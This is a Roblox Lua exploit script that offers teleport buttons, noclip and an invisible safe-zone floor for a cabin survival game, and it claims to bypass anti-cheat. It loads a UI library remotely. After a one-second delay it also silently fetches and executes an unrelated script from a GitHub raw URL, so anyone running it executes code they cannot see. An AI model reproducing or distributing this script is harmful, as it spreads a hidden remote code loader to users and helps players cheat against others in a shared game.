-- Carrega a biblioteca Rayfield
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

-- Cria janela/interface
local Window = Rayfield:CreateWindow({
    Name = "Teleport Menu night 3 cabins",
    LoadingTitle = "Teleport System",
    LoadingSubtitle = "Shadown_gd",
    ConfigurationSaving = {
        Enabled = true,
        FileName = "TeleportMenuConfig"
    }
})

-- Mostra notificação inicial
Rayfield:Notify({
    Title = "credits: juão",
    Content = "bypassed anti-cheat (It's not 100% safe)",
    Duration = 5,
    Image = 4483362458
})

-- Aguarda 1 segundo e executa o loadstring remoto
task.delay(1, function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DAVI98458/Nicescript/refs/heads/main/game%20happy", true))()
end)

-- Cria aba principal
local TeleportTab = Window:CreateTab("Teleports", 4483362458)

-- Serviços e função de teleporte
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local player = Players.LocalPlayer

local function teleportTo(position)
    local character = player.Character or player.CharacterAdded:Wait()
    local root = character:FindFirstChild("HumanoidRootPart")
    if root then
        root.CFrame = CFrame.new(position)
    end
end

-- Função de noclip
local noclipActive = false
local noclipConnection

local function enableNoclip()
    if noclipActive then return end
    noclipActive = true

    noclipConnection = RunService.Stepped:Connect(function()
        local character = player.Character
        if character then
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end)
end

-- Botões de teleporte
TeleportTab:CreateButton({
    Name = "Cabin 1",
    Callback = function()
        teleportTo(Vector3.new(102, 4, -245))
    end
})

TeleportTab:CreateButton({
    Name = "Cabin 2",
    Callback = function()
        teleportTo(Vector3.new(-33, 4, 68))
    end
})

TeleportTab:CreateButton({
    Name = "Cabin 3",
    Callback = function()
        teleportTo(Vector3.new(-40, 4, 267))
    end
})

TeleportTab:CreateButton({
    Name = "Cabin 4",
    Callback = function()
        teleportTo(Vector3.new(231, 4, 243))
    end
})

TeleportTab:CreateButton({
    Name = "Lodge",
    Callback = function()
        teleportTo(Vector3.new(-233, 17, 110))
    end
})

-- Botão de Safe Zone com noclip e chão invisível
TeleportTab:CreateButton({
    Name = "Safe Zone (super safe!)[Do not move when teleported]",
    Callback = function()
        teleportTo(Vector3.new(-54, 15, 252))
        enableNoclip()

        if not Workspace:FindFirstChild("SafeZoneFloor") then
            local floor = Instance.new("Part")
            floor.Name = "SafeZoneFloor"
            floor.Size = Vector3.new(20, 1, 20)
            floor.Position = Vector3.new(-54, 50, 252)
            floor.Anchored = true
            floor.CanCollide = true
            floor.Transparency = 1
            floor.Parent = Workspace
        end
    end
})
